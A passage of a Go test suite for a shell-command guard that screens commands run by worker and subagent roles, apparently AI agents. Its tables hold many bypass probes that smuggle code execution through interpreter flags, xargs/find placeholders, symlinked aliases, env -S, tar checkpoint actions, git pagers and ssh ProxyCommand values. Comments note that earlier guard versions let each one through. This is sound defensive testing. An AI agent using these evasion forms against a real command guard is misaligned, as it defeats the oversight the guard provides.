		// cwd/mycat -> /bin/sh — the stream is a local shell program and the
		// rewrite is allowed (true). The boolean flip proves the env -C
		// seed actually steered resolution (no vacuous false).
		var noEnv envAssignments
		if _, ok := scriptAllowsLocalShellStdinPrepare("./mycat", false, noEnv, os.Getenv("PATH"), caller); !ok {
			t.Fatalf("./mycat -> /bin/sh at cwd must allow the stdin shell rewrite")
		}
		// Bare sh stays a local shell target without any outer env.
		if _, ok := scriptAllowsLocalShellStdinPrepare("sh", false, noEnv, os.Getenv("PATH"), caller); !ok {
			t.Fatalf("bare sh without outerEnv must still allow the stdin shell rewrite")
		}
	})
}

// ---------------------------------------------------------------------------
// R6 MF-1: non-ssh alias heads under xargs/find -exec — the peeled target's
// resolved basename must face the SAME code-slot and ssh screens as the
// typed name (`env -C sub ./mysh -c` where mysh -> /bin/sh feeds xargs /
// find placeholders into a hidden shell -c slot), and the stdin-target
// language lookup must resolve through the alias too.
// ---------------------------------------------------------------------------

func TestGuard_R6_XargsFindAliasCodeSlot(t *testing.T) {
	fakeHome := withTestTrustedHome(t)
	cwd := filepath.Join(fakeHome, "proj")
	sub := filepath.Join(cwd, "sub")
	if err := os.MkdirAll(sub, 0755); err != nil {
		t.Fatalf("mkdir sub: %v", err)
	}
	if err := os.Symlink("/bin/sh", filepath.Join(sub, "mysh")); err != nil {
		t.Fatalf("symlink mysh -> /bin/sh: %v", err)
	}
	for _, tc := range []struct {
		name  string
		cmd   string
		argv  []string
		stdin string
	}{
		// The -C re-anchor moves ./mysh resolution into sub where the alias
		// resolves to a shell: the trailing -c slot is an open code flag the
		// piped word feeds — xargsFeedsCodeFlag must see the RESOLVED head.
		{"xargs env -C sub ./mysh -c", `echo pig | xargs env -C sub ./mysh -c`, nil, ""},
		// -I{}: the replace token sits in the -c code slot of the alias —
		// replTokenInExecSlot must see it through the resolved head.
		{"xargs -I{} env -C sub ./mysh -c {}", `echo pig | xargs -I{} env -C sub ./mysh -c '{}'`, nil, ""},
		// find -exec twin: {} in the alias's -c slot.
		{"find -exec env -C sub ./mysh -c {}", `find . -exec env -C sub ./mysh -c {} \;`, nil, ""},
		// argv + stdin: the xargs target resolves to a shell whose -c slot
		// is flag-open — the streamed "pig" must block, never slip into a
		// data / unscreened target path.
		{"argv xargs env -C sub ./mysh -c stdin", ``, []string{"xargs", "env", "-C", "sub", "./mysh", "-c"}, "pig"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			got := rtGuardCwd(t, rtCase{
				id: tc.name, role: "worker",
				cmd: tc.cmd, argv: tc.argv, stdin: tc.stdin,
			}, cwd)
			if got == "ALLOW" {
				t.Fatalf("%s = ALLOW, want a guard block", tc.name)
			}
		})
	}

	// Non-shell interpreter alias via xargs: stdinProgramTargetsWithEnv must
	// resolve the target basename to "ruby" instead of falling back to "".
	t.Run("xargs env -C sub ./myruby -e keeps ruby lang", func(t *testing.T) {
		rubyStub := filepath.Join(sub, "ruby")
		writeTestExecutable(t, rubyStub, 0755)
		if err := os.Symlink(rubyStub, filepath.Join(sub, "myruby")); err != nil {
			t.Fatalf("symlink myruby -> ruby: %v", err)
		}
		caller := callerIdentity{cwd: cwd}
		targets := stdinProgramTargetsWithEnv([]string{"xargs", "env", "-C", "sub", "./myruby", "-e"}, 0, envAssignments{}, os.Getenv("PATH"), caller)
		if len(targets) != 1 || targets[0].lang != "ruby" {
			t.Fatalf("targets = %+v, want 1 target with lang=ruby", targets)
		}
	})

	// Cross-family structural conflict (sh -> python3) must fail closed in
	// replTokenInExecSlot and xargsFeedsCodeFlag.
	t.Run("cross-family conflict sh -> python3 fails closed", func(t *testing.T) {
		pyStub := filepath.Join(sub, "python3")
		writeTestExecutable(t, pyStub, 0755)
		if err := os.Symlink(pyStub, filepath.Join(sub, "sh")); err != nil {
			t.Fatalf("symlink sh -> python3: %v", err)
		}
		caller := callerIdentity{cwd: cwd}
		if !replTokenInExecSlot([]string{"env", "-C", "sub", "./sh", "{}"}, "{}", os.Getenv("PATH"), caller) {
			t.Fatalf("replTokenInExecSlot must fail closed on cross-family sh -> python3")
		}
		if !xargsFeedsCodeFlag([]string{"env", "-C", "sub", "./sh"}, nil, os.Getenv("PATH"), caller) {
			t.Fatalf("xargsFeedsCodeFlag must fail closed on cross-family sh -> python3")
		}
	})
}

// ---------------------------------------------------------------------------
// R6 SF-1: prepareCtxRunShellTargets multi-target order independence — the
// same payload under reversed target-env order must yield the SAME verdict
// (one rewrite decision never rides on targetEnvs[0] alone).
// ---------------------------------------------------------------------------

func TestGuard_R6_MultiTargetOrderIndependent(t *testing.T) {
	fakeHome := withTestTrustedHome(t)
	cargoBin := filepath.Join(fakeHome, ".cargo", "bin")
	if err := os.MkdirAll(cargoBin, 0755); err != nil {
		t.Fatalf("mkdir cargoBin: %v", err)
	}
	stubDir := filepath.Join(fakeHome, "stubdir")
	if err := os.MkdirAll(stubDir, 0755); err != nil {
		t.Fatalf("mkdir stubDir: %v", err)
	}
	stub := filepath.Join(stubDir, "herdr-core-stub")
	writeTestExecutable(t, stub, 0755)
	if err := os.Symlink(stub, filepath.Join(cargoBin, "hc")); err != nil {
		t.Fatalf("symlink cargoBin/hc: %v", err)
	}
	// The shadow hc is only visible under the PATH=<cargoBin> env; the clean
	// target sees the REAL hc. Whatever the target order, the per-target
	// guard under the cargo env must block on the planted shadow — the
	// order-independence fix guarantees the first-env rewrite never leaks
	// past the second env's screen.
	g := guardCall{subagent: true}
	// Same scenario through the REAL entry point: `sh ; PATH=<cargoBin>
	// sh` and `PATH=<cargoBin> sh ; sh` feed the stream to TWO local
	// shell targets — the first target's env is the clean outer PATH,
	// the second's carries the shadow dir. Whatever the order, the
	// cargo-env guard must block the planted-shadow `hc send` stdin
	// payload; the SF-1 fix additionally guarantees the rewrite itself
	// never rides on targetEnvs[0] alone (a clean-first order would
	// otherwise mint an --hc-gate edit the shadow order never saw).
	for _, tc := range []struct {
		name string
		argv []string
	}{
		{"clean first", []string{"sh", "-c", `sh ; PATH=` + cargoBin + `:$PATH sh`}},
		{"shadow first", []string{"sh", "-c", `PATH=` + cargoBin + `:$PATH sh ; sh`}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			prep := g.prepareCtxRunArgv(tc.argv, "hc send t42 ok")
			if prep.rule == "" && strings.Contains(prep.execStdin, "--hc-gate") {
				t.Fatalf("%s: shadow hc stdin rewritten to --hc-gate: %q", tc.name, prep.execStdin)
			}
			if prep.rule == "" {
				t.Fatalf("%s: prepareCtxRunArgv passed, want planted shadow block", tc.name)
			}
		})
	}
	// Direct envAssignments probe: the same two target-env slices in
	// either order must produce the SAME verdict.
	var cleanEnv, cargoEnv envAssignments
	cleanEnv.ops = append(cleanEnv.ops, envOp{kind: 'a', key: "PATH", value: "/usr/bin:/bin"})
	cargoEnv.ops = append(cargoEnv.ops, envOp{kind: 'a', key: "PATH", value: cargoBin + ":/usr/bin:/bin"})
	for _, tc := range []struct {
		name string
		envs []envAssignments
	}{
		{"clean first direct", []envAssignments{cleanEnv, cargoEnv}},
		{"shadow first direct", []envAssignments{cargoEnv, cleanEnv}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			sp := g.prepareCtxRunShellTargets(`hc send t42 "$x"`, tc.envs)
			if sp.rule == "" {
				t.Fatalf("%s: prepareCtxRunShellTargets passed, want planted shadow block", tc.name)
			}
		})
	}

	// Symmetric two-segment payload: under the CLEAN env both `hc send`
	// candidates rewrite (bare `hc` resolves through trustedBin to the
	// install slot, the absolute `<trustedBin>/hc` spelling is a path
	// admitted by admittedReadonlyCanonicalHead) — 2 edits. Under the
	// CARGO env the bare `hc` resolves to the planted shadow (never
	// rewritable) while the absolute spelling still admits — 1 edit.
	// The counts disagree, so the order-independent guard drops the
	// whole rewrite and the cargo-env guard pass blocks the shadow
	// `hc send` head.
	trustedBin := filepath.Join(fakeHome, ".local", "bin")
	if err := os.MkdirAll(trustedBin, 0755); err != nil {
		t.Fatalf("mkdir trustedBin: %v", err)
	}
	realHc := filepath.Join(trustedBin, "herdr-core")
	writeTestExecutable(t, realHc, 0755)
	if err := os.Symlink(realHc, filepath.Join(trustedBin, "hc")); err != nil {
		t.Fatalf("symlink hc -> herdr-core: %v", err)
	}
	var cleanEnv2 envAssignments
	cleanEnv2.ops = append(cleanEnv2.ops, envOp{kind: 'a', key: "PATH", value: trustedBin + ":/usr/bin:/bin"})
	code2 := `hc send t42 "$x" ; ` + trustedBin + `/hc send t42 "$y"`
	for _, tc := range []struct {
		name string
		envs []envAssignments
	}{
		{"clean first symmetric", []envAssignments{cleanEnv2, cargoEnv}},
		{"shadow first symmetric", []envAssignments{cargoEnv, cleanEnv2}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			sp := g.prepareCtxRunShellTargets(code2, tc.envs)
			if sp.rule == "" {
				t.Fatalf("%s: prepareCtxRunShellTargets passed, want planted shadow block", tc.name)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// v6.2.2 待办 1: Python `--` 长选项解析统一收敛 —
// --check-hash-based-pycs 两种形态（=val / 空格分隔）在任何守卫入口都不再
// 逃逸，未知 Python `--` 长选项保守 fail-closed，合法查询长选项保持放行。
// ---------------------------------------------------------------------------

func TestGuard_V622_PythonLongOpts(t *testing.T) {
	blockCases := []struct {
		name, role, ro, cmd string
		want                string
	}{
		// 粘连值形态：基线误把 heck-hash-based-pycs=default 当 -c 载荷放行。
		{"v622-1a glued -c", "worker", "", `python3 --check-hash-based-pycs=default -c 'import os; os.system("pig")'`, "python"},
		// worker+ro=1（strict readonly verifier 模型）：基线漏审 python 写文件载荷。
		{"v622-1b verifier write", "worker", "1", `python3 --check-hash-based-pycs default -c "open('out.txt', 'w')"`, "python"},
		// worker 嵌套代理守卫：-c 载荷含 pig，基线借长选项逃逸。
		{"v622-1b2 worker subagent write", "worker", "", `python3 --check-hash-based-pycs default -c "open('out.txt', 'w'); import os; os.system('pig')"`, "python"},
		// 空格分隔形态："default" 不得提前终止选项区扫描。
		{"v622-1c xargs -c feed", "worker", "", `echo 'import os; os.system("pig")' | xargs python3 --check-hash-based-pycs default -c`, "BLOCK"},
		{"v622-1d find -exec -c", "worker", "", `find . -exec python3 --check-hash-based-pycs default -c '{}' \;`, "BLOCK"},
		{"v622-1e1 -m after long", "worker", "", `python3 --check-hash-based-pycs default -m pig`, "pig"},
		{"v622-1e2 -um glued", "worker", "", `python3 -um pig`, "pig"},
		// 未知 Python 长选项（--jit off）：操作数 arity 不可知，fail-closed。
		{"v622-1f unknown long", "worker", "", `python3 --jit off -c 'import os; os.system("pig")'`, "BLOCK"},
		{"v622-1f2 missing mode", "worker", "", `python3 --check-hash-based-pycs -c 'print(1)'`, "BLOCK"},
		{"v622-1f3 bad mode", "worker", "", `python3 --check-hash-based-pycs=bogus -c 'print(1)'`, "BLOCK"},
	}
	for _, tc := range blockCases {
		t.Run(tc.name, func(t *testing.T) {
			got := rtGuardCwd(t, rtCase{id: tc.name, role: tc.role, ro: tc.ro, cmd: tc.cmd}, "")
			if tc.want == "BLOCK" {
				if got == "ALLOW" {
					t.Fatalf("rtGuardCwd(%q) = ALLOW, want a guard block", tc.cmd)
				}
				return
			}
			if !strings.Contains(got, tc.want) {
				t.Fatalf("rtGuardCwd(%q) = %q, want substring %q", tc.cmd, got, tc.want)
			}
		})
	}
	allowCases := []struct {
		name, role, ro, cmd string
	}{
		{"worker python3 --version", "worker", "", `python3 --version`},
		{"verifier python3 --version", "verifier", "", `python3 --version`},
		{"worker python3 --help-all", "worker", "", `python3 --help-all`},
		{"worker pycs then --version", "worker", "", `python3 --check-hash-based-pycs=default --version`},
		{"worker pycs benign -c", "worker", "", `python3 --check-hash-based-pycs default -c 'print(1)' "$HOME"`},
		{"worker script custom flag", "worker", "", `python3 app.py --custom-flag val`},
	}
	for _, tc := range allowCases {
		t.Run(tc.name, func(t *testing.T) {
			got := rtGuardCwd(t, rtCase{id: tc.name, role: tc.role, ro: tc.ro, cmd: tc.cmd}, "")
			if got != "ALLOW" {
				t.Fatalf("rtGuardCwd(%q) = %q, want ALLOW", tc.cmd, got)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// v6.2.2 待办 2: JavaScript 族拆族 — bun/ts-node/tsx 不再与 node/nodejs
// 共享结构族；跨名软链（bun -> node）conflicting structural alias fail-
// closed，真实 bun/tsx 自身的 -p/--print 内联代码也被拦截；node <-> nodejs
// 同族合法软链保持放行。
// ---------------------------------------------------------------------------

func TestGuard_V622_JSFamilySplit(t *testing.T) {
	fakeHome := withTestTrustedHome(t)
	binDir := filepath.Join(fakeHome, ".local", "bin")
	if err := os.MkdirAll(binDir, 0755); err != nil {
		t.Fatalf("mkdir binDir: %v", err)
	}
	writeTestExecutable(t, filepath.Join(binDir, "node"), 0755)
	for _, name := range []string{"bun", "tsx"} {
		if err := os.Symlink(filepath.Join(binDir, "node"), filepath.Join(binDir, name)); err != nil {
			t.Fatalf("symlink %s -> node: %v", name, err)
		}
	}
	pathEnv := binDir + ":" + os.Getenv("PATH")
	origPath := os.Getenv("PATH")
	t.Setenv("PATH", pathEnv)
	for _, tc := range []struct {
		name, cmd string
	}{
		{"v622-2a bun symlink", `bun -p 'require("child_process").execSync("pig")'`},
		{"v622-2b tsx symlink", `tsx -p 'require("child_process").execSync("pig")'`},
	} {
		t.Run(tc.name, func(t *testing.T) {
			got := rtGuardCwd(t, rtCase{id: tc.name, role: "worker", cmd: tc.cmd}, "")
			if got == "ALLOW" {
				t.Fatalf("rtGuardCwd(%q) = ALLOW, want conflicting structural alias block", tc.cmd)
			}
		})
	}
	// Direct bun -p with no symlink at all: -p is inline code and must hit
	// the nested-agent scan even when resolution finds nothing. The PATH
	// restore must re-bind the ORIGINAL PATH — re-reading os.Getenv after
	// t.Setenv would hand back the already-modified value and keep the
	// bun -> node symlink visible (v6.2.2 Oracle R1 Obs-2).
	t.Setenv("PATH", origPath)
	t.Run("v622-2c direct bun -p", func(t *testing.T) {
		got := rtGuardCwd(t, rtCase{id: "v622-2c", role: "worker", cmd: `bun -p 'require("child_process").execSync("pig")'`}, "")
		if !strings.Contains(got, "javascript inline code") {
			t.Fatalf("direct bun -p = %q, want javascript inline code block", got)
		}
	})
	// node -> nodejs is the same distro family: the inline code is
	// screened under the shared node grammar, never a conflicting alias.
	writeTestExecutable(t, filepath.Join(binDir, "nodejs"), 0755)
	if err := os.Remove(filepath.Join(binDir, "node")); err != nil {
		t.Fatalf("remove node stub: %v", err)
	}
	if err := os.Symlink(filepath.Join(binDir, "nodejs"), filepath.Join(binDir, "node")); err != nil {
		t.Fatalf("symlink node -> nodejs: %v", err)
	}
	t.Setenv("PATH", pathEnv)
	t.Run("node->nodejs same family no conflict", func(t *testing.T) {
		got := rtGuardCwd(t, rtCase{id: "v622-node-nodejs", role: "worker", argv: []string{"node", "-p", "1+1"}}, "")
		if strings.Contains(got, "conflicting structural alias") {
			t.Fatalf("node -> nodejs = %q, want no conflicting structural alias", got)
		}
	})
}

// ---------------------------------------------------------------------------
// v6.2.2 待办 3: replTokenInExecSlot / xargsFeedsCodeFlag 受限递归穿透 —
// 二层 xargs / flock -c / watch -x / script -qc / find -okdir / 悬空 env
// 包装器与 peelChainMaxDepth 深度上限全部 fail-closed；数据位 {} 保持放行。
// ---------------------------------------------------------------------------

func TestGuard_V622_MultiLayerExecSlots(t *testing.T) {
	blockCases := []struct {
		name, cmd string
	}{
		{"v622-3a xargs flock -c", `echo pig | xargs -I{} flock -x /dev/null -c '{}'`},
		{"v622-3b find xargs sh -c", `find . -exec xargs sh -c {} \;`},
		{"v622-3c1 xargs watch -x repl", `echo pig | xargs -I{} watch -x sh -c '{}'`},
		{"v622-3c2 xargs watch -x open", `echo pig | xargs watch -x sh -c`},
		{"v622-3d1 find -okdir flock cmd", `xargs -I% find . -okdir flock /tmp/lk --command='%' \;`},
		{"v622-3d2 script -qc token", `xargs -I{} script -qc '{}' /dev/null`},
		{"v622-3d3 dangling env", `echo pig | xargs env`},
	}
	for _, tc := range blockCases {
		t.Run(tc.name, func(t *testing.T) {
			got := rtGuardCwd(t, rtCase{id: tc.name, role: "worker", cmd: tc.cmd}, "")
			if got == "ALLOW" {
				t.Fatalf("rtGuardCwd(%q) = ALLOW, want dynamic code payload block", tc.cmd)
			}
		})
	}
	allowCases := []struct {
		name, cmd string
	}{
		{"flock data operand", `find . -exec flock /tmp/lk grep foo {} \;`},
		{"watch -x data operand", `echo foo | xargs -I{} watch -x grep foo {}`},
		{"find path-position token", `echo x | xargs -I{} find {} -maxdepth 1 -name '*.go'`},
	}
	for _, tc := range allowCases {
		t.Run(tc.name, func(t *testing.T) {
			got := rtGuardCwd(t, rtCase{id: tc.name, role: "worker", cmd: tc.cmd}, "")
			if got != "ALLOW" {
				t.Fatalf("rtGuardCwd(%q) = %q, want ALLOW", tc.cmd, got)
			}
		})
	}
	// v622-3e: 25 层 watch -x 嵌套直达 peelChainMaxDepth (24) — 两处直接
	// 单测入口都必须 fail-closed。
	t.Run("v622-3e depth cap", func(t *testing.T) {
		deep := []string{"echo", "safe"}
		for n := 0; n < 25; n++ {
			deep = append([]string{"watch", "-x"}, deep...)
		}
		caller := callerIdentity{}
		if !replTokenInExecSlot(deep, "{}", os.Getenv("PATH"), caller) {
			t.Fatalf("replTokenInExecSlot 25-layer watch -x = false, want depth-cap fail-closed")
		}
		if !xargsFeedsCodeFlag(deep, nil, os.Getenv("PATH"), caller) {
			t.Fatalf("xargsFeedsCodeFlag 25-layer watch -x = false, want depth-cap fail-closed")
		}
	})
}

// ---------------------------------------------------------------------------
// v6.2.2 Oracle R1: MF-1〜MF-9 / SF-1〜SF-5 / Obs-1〜Obs-2 探针回归 —
// Python -c/-m 后选项区终止与 -uW/-uX 短簇四处同构、bun -c/node -r/php -c
// 值槽动态拦截、npm 族结构头与 shell --rcfile、env -S 包装链扫描、递归
// caller 重锚、find 谓词/尾部追加/-fprintf 二元 arity、占位符非首词注入、
// script/flock 选项状态机、xargs --r* 缩写、awk/sed/tar/git -c 执行槽、
// find -H/-L/-P 前置标志豁免。
// ---------------------------------------------------------------------------

func TestGuard_V622_OracleR1Probes(t *testing.T) {
	blockCases := []struct {
		name, cmd string
	}{
		// MF-2: -uW/-uX 短簇消费下一 argv 后，$OPT 动态词与非法长选项均 fail-closed。
		{"P-MF2-a -uW dynOPT", `OPT=-c; python3 -uW ignore "$OPT" 'import os; os.system("pig")'`},
		{"P-MF2-b -uW unknown long", `python3 -uW ignore --jit off -c 'import os; os.system("pig")'`},
		{"P-MF2-c -uW bad pycs", `python3 -uW ignore --check-hash-based-pycs=bogus -c 'import os; os.system("pig")'`},
		{"P-MF2-f xargs -0 feed", `printf '%s\0' -c 'import os; os.system("pig")' | xargs -0 python3 -uW ignore`},
		// MF-3: bun -c 是 bunfig 值槽而非代码标志——动态操作数 fail-closed。
		{"P-MF3-a bun -c $X", `X='a.toml -e require("child_process").execSync("pig")'; bun -c $X`},
		// MF-4b: shell --rcfile/--init-file 值槽消费与非 /dev/null fail-closed。
		{"P-MF4b-1 bash rcfile -c", `bash --rcfile /etc/profile -c 'pig'`},
		{"P-MF4b-2 xargs rcfile open -c", `echo pig | xargs bash --rcfile /dev/null -c`},
		{"P-MF4b-3 find rcfile -c", `find . -exec bash --rcfile /etc/profile -c '{}' \;`},
		{"P-MF4b-4 pipe rcfile stdin", `echo pig | bash --rcfile /dev/null`},
		// MF-5: env -S 分词注入——前导包装器/赋值/裸 '-'/GNU 缩写全线拦截。
		{"P-MF5-a nice env -S", `echo "-e system('pig')" | xargs -I{} nice env -S 'perl {}'`},
		{"P-MF5-b FOO=1 env -S", `echo "-e system('pig')" | xargs -I{} FOO=1 env -S 'perl {}'`},
		{"P-MF5-c env - -S", `echo "-e system('pig')" | xargs -I{} env - -S 'perl {}'`},
		{"P-MF5-d env --split abbrev", `echo "-e system('pig')" | xargs -I{} env --split 'perl {}'`},
		// MF-7: find 路径位占位符全后缀扫描、尾部追加、-fprintf 二元 arity。
		{"P-MF7-a pathword exec suffix", `echo -exec | xargs -I% find . % pig ';'`},
		{"P-MF7-b append mode", `printf -- '-exec\npig\n;\n' | xargs find .`},
		{"P-MF7-c fprintf shift", `echo pig | xargs -I{} find . -fprintf /dev/null -exec -exec sh -c '{}' ';'`},
		// MF-8: shell/解释器选项区占位符、内层 xargs 选项位、flock 锁文件位、ssh 本地与远端注入。
		{"P-MF8-a sh opt zone", `echo -c | xargs -I% sh % 'pig'`},
		{"P-MF8-b python opt zone", `echo -c | xargs -I% python3 % 'import os; os.system("pig")'`},
		{"P-MF8-c inner xargs zone", `echo pig > /tmp/p && echo 'I{}' | xargs -I% xargs -a /tmp/p -% sh -c '{}'`},
		{"P-MF8-d flock lockfile zone", `echo -c | xargs -I% flock % 'sh -c pig' /dev/null`},
		{"P-MF8-e ssh dest zone", `echo '-oProxyCommand=pig' | xargs -I{} ssh {} dmit ls`},
		{"P-MF8-f1 ssh remote repl", `echo '; pig' | xargs -I{} ssh dmit 'echo {}'`},
		{"P-MF8-f2 ssh remote append", `echo '; pig' | xargs ssh dmit echo hi`},
		// MF-9: script -T 文件名字母 c 不再误判、flock 短簇/--/--fcntl 修正。
		{"P-MF9-a script -T open -c", `echo pig | xargs script -T/tmp/xc -c`},
		{"P-MF9-b script -T token -c", `echo pig | xargs -I{} script -T/tmp/c.log -c '{}' /dev/null`},
		{"P-MF9-c flock -xc cluster", `echo pig | xargs -I{} flock -xc '{}' /dev/null`},
		{"P-MF9-d flock -- then -c", `echo pig | xargs -I{} flock -- /dev/null -c '{}'`},
		{"P-MF9-e flock --fcntl boolean", `echo pig | xargs -I{} flock --fcntl /dev/null sh -c '{}'`},
		// SF-3: GNU xargs --r* 唯一前缀缩写。
		{"SF3 xargs --repl", `echo pig | xargs --repl sh -c '{}'`},
		// SF-4: awk/sed/tar/git -c 执行槽。
		{"SF4 awk program", `echo 'BEGIN{system("pig")}' | xargs -I{} awk '{}' /dev/null`},
		{"SF4 sed script", `echo '1e pig' | xargs -I{} sed '{}' /dev/null`},
		{"SF4 tar checkpoint-action", `echo 'pig' | xargs -I{} tar --checkpoint=1 --checkpoint-action=exec='{}' -cf /dev/null /dev/null`},
		{"SF4 git -c pager", `echo 'pig' | xargs -I{} git -c core.pager='{}' log`},
		// SF-5: node --input-type 入 longValue 后动态/静态错位不再逃逸。
		{"SF5 node --input-type", `node --input-type commonjs -e 'require("child_process").execSync("pig")'`},
	}
	for _, tc := range blockCases {
		t.Run(tc.name, func(t *testing.T) {
			got := rtGuardCwd(t, rtCase{id: tc.name, role: "worker", cmd: tc.cmd}, "")
			if got == "ALLOW" {
				t.Fatalf("rtGuardCwd(%q) = ALLOW, want a guard block", tc.cmd)
			}
		})
	}
	// MF-1 功能回归与 Obs-1 假阳性豁免：以下合法调用必须放行。
	allowCases := []struct {
		name, cmd string
	}{
		{"P-MF1-a pytest module", `python3 -m pytest --cov=x`},
		{"P-MF1-b json.tool module", `python3 -m json.tool --sort-keys`},
		{"P-MF1-c -c then script args", `python3 -c 'import sys; print(sys.argv)' --foo`},
		{"P-OBS1 find -L path token", `echo src | xargs -I{} find -L {} -name '*.go'`},
	}
	for _, tc := range allowCases {
		t.Run(tc.name, func(t *testing.T) {
			got := rtGuardCwd(t, rtCase{id: tc.name, role: "worker", cmd: tc.cmd}, "")
			if got != "ALLOW" {
				t.Fatalf("rtGuardCwd(%q) = %q, want ALLOW", tc.cmd, got)
			}
		})
	}
	// P-MF2-d: screenReadonlyWrite 对 -uX 携带值与粘连 -c 的只读文件运行拦截。
	t.Run("P-MF2-d readonly -uX", func(t *testing.T) {
		if got := screenReadonlyWrite([]string{"python3", "-uX", "--version", "evil.py"}); got == "" {
			t.Fatalf("screenReadonlyWrite python3 -uX --version evil.py = empty, want python3 block")
		}
	})
	t.Run("P-MF2-d2 readonly glued -c", func(t *testing.T) {
		if got := screenReadonlyWrite([]string{"python3", "-c__import__('os').system('touch /tmp/pwn')", "--version"}); got == "" {
			t.Fatalf("screenReadonlyWrite glued -c --version = empty, want python3 block")
		}
	})
}

// ---------------------------------------------------------------------------
// v6.2.2 Oracle R2 (R3 闭环): R2-MF-1..7 / R2-SF-1..4 / R2-Obs-1..2 探针回归 —
// 长值选项 valueExact 统一消费与动态校验、pyInterpScanStep consumesNext 恢复
// 粘连 -m、sed/awk/git 复用仓内单源解析器、script -t optional_argument 与
// 位置参数置换、flock/xargs/tar GNU 唯一前缀缩写、ssh 短簇值操作数、xargs -a
// 与 argv+stdin 闭合、peelExecSlotHead canonical 变体写回、find 谓词表补齐、
// env -S 包装链约束扫描。每条 block 探针在修复前均为 ALLOW（或回归BLOCK），
// 每条 allow 探针钉住不得误伤的合法调用。
// ---------------------------------------------------------------------------

func TestGuard_V622_OracleR2Probes(t *testing.T) {
	blockCases := []struct {
		name, cmd string
	}{
		// R2-MF-1: 非 Python 长值选项经 valueExact 统一消费并校验动态操作数。
		{"P-R2-MF1-a bash rcfile /dev/null $OPT", `OPT=-c; bash --rcfile /dev/null "$OPT" 'pig'`},
		{"P-R2-MF1-b bash double rcfile", `bash --rcfile /dev/null --rcfile /etc/profile -c 'pig'`},
		{"P-R2-MF1-c node --conditions --import", `X='a.js -e require("child_process").execSync("pig")'; node --conditions default --import $X`},
		{"P-R2-MF1-d bun --cwd -c", `X='a.toml -e require("child_process").execSync("pig")'; bun --cwd . -c $X`},
		{"P-R2-MF1-e node --input-type -r", `X='a.js -e require("child_process").execSync("pig")'; node --input-type commonjs -r $X`},
		{"P-R2-MF1-f node --require no reverse polarity", `X='a.js -e require("child_process").execSync("pig")'; node --require $X`},
		// R2-MF-2: spec 驱动短簇带值消费先查动态词再 i++。
		{"P-R2-MF2-c python3 -uW dyn", `X='ignore -c __import__("os").system("pig")'; python3 -uW $X`},
		{"P-R2-MF2-d bash -xo cluster", `bash -xo errexit --rcfile /etc/profile -c 'pig'`},
		{"P-R2-MF2-e sh -xo dynOPT", `OPT=-c; sh -xo errexit "$OPT" 'pig'`},
		{"P-R2-MF2-f perl -wI dyn", `X='/tmp -e system("pig")'; perl -wI /tmp -I $X`},
		{"P-R2-MF2-g perl -wI heredoc", "perl -wI /tmp <<'EOF'\nsystem(\"pig\")\nEOF"},
		// R2-MF-3: sed/awk/git 复用单源解析器后的绕过面。
		{"P-R2-MF3-d sed -ne glued", `echo '1e pig' | xargs -I{} sed -ne'{}' /etc/hosts`},
		{"P-R2-MF3-e sed --expr abbrev", `echo '1e pig' | xargs -I{} sed --expr='{}' /etc/hosts`},
		{"P-R2-MF3-f gawk -e glued", `echo 'BEGIN{system("pig")}' | xargs -I{} gawk -e'{}' /dev/null`},
		{"P-R2-MF3-g gawk --assign then token", `echo 'BEGIN{system("pig")}' | xargs -I{} gawk --assign x=1 '{}' /dev/null`},
		{"P-R2-MF3-h git -c bare token", `echo 'core.pager=pig' | xargs -I{} git -c '{}' log`},
		{"P-R2-MF3-i git optzone token", `echo '-c' | xargs -I% git % 'core.pager=pig' log`},
		{"P-R2-MF3-j git merge driver key", `echo 'pig' | xargs -I{} git -c 'merge.foo.driver={}' merge`},
		// R2-MF-4: script -t optional_argument / 长选项补全 / 位置参数置换;
		// flock GNU 唯一前缀缩写。
		{"P-R2-MF4-a script -t bare", `script -t -c 'pig' /dev/null`},
		{"P-R2-MF4-b xargs script -t", `echo pig | xargs -I{} script -t -c '{}' /dev/null`},
		{"P-R2-MF4-c script --timing bare", `script --timing -c 'pig' /dev/null`},
		{"P-R2-MF4-d script --log-io", `script --log-io /dev/null -c 'pig'`},
		{"P-R2-MF4-e script positional then -c", `script /dev/null -c 'pig'`},
		{"P-R2-MF4-f flock --com glued", `flock --com='pig' /dev/null`},
		{"P-R2-MF4-g flock --time separate", `flock --time 5 /dev/null -c 'pig'`},
		// R2-MF-5: ssh 短簇带值操作数不再冒充 destination。
		{"P-R2-MF5-a ssh -p operand", `echo '-oProxyCommand=pig' | xargs -I{} ssh -p 22 {} dmit ls`},
		// R2-MF-6: interpOptionZoneHasToken spec 驱动跳值、多 -e 继续扫描。
		{"P-R2-MF6-a python3 -W operand", `echo -c | xargs -I% python3 -W ignore % 'import os; os.system("pig")'`},
		{"P-R2-MF6-b sh -o operand", `echo -c | xargs -I% sh -o errexit % 'pig'`},
		{"P-R2-MF6-c bun -c value then token", `echo -e | xargs -I% bun -c a.toml % 'require("child_process").execSync("pig")'`},
		{"P-R2-MF6-d perl multi -e", `echo -e | xargs -I% perl -e '1' % 'system("pig")'`},
		{"P-R2-MF6-e php -r then token", `echo -r | xargs -I% php -r '1;' % 'system("pig");'`},
		{"P-R2-MF6-f script optzone token", `echo -c | xargs -I% script % 'pig' /dev/null`},
		// R2-SF-1..4: canonical 变体、find 谓词、xargs/tar GNU 缩写、stdin spec 派生。
		{"P-R2-SF1-a gfind canonical", `echo pig | xargs -I% gfind . -exec sh -c '%' ';'`},
		{"P-R2-SF2-a find -newermm shift", `find . -newermm -exec -exec pig ';'`},
		{"P-R2-SF3-a xargs --replace= empty", `echo pig | xargs --replace= sh -c '{}'`},
		{"P-R2-SF3-b xargs --max-a abbrev", `echo pig | xargs --max-a 1 -I{} sh -c '{}'`},
		{"P-R2-SF3-c tar -cI cluster", `echo 'pig' | xargs -I{} tar -cI '{}' -f /dev/null /dev/null`},
		{"P-R2-SF4-a bun --cwd stdin", `echo 'require("child_process").execSync("pig")' | bun --cwd . -`},
	}
	for _, tc := range blockCases {
		t.Run(tc.name, func(t *testing.T) {
			got := rtGuardCwd(t, rtCase{id: tc.name, role: "worker", cmd: tc.cmd}, "")
			if got == "ALLOW" {
				t.Fatalf("rtGuardCwd(%q) = ALLOW, want a guard block", tc.cmd)
			}
		})
	}
	allowCases := []struct {
		name, cmd string
	}{
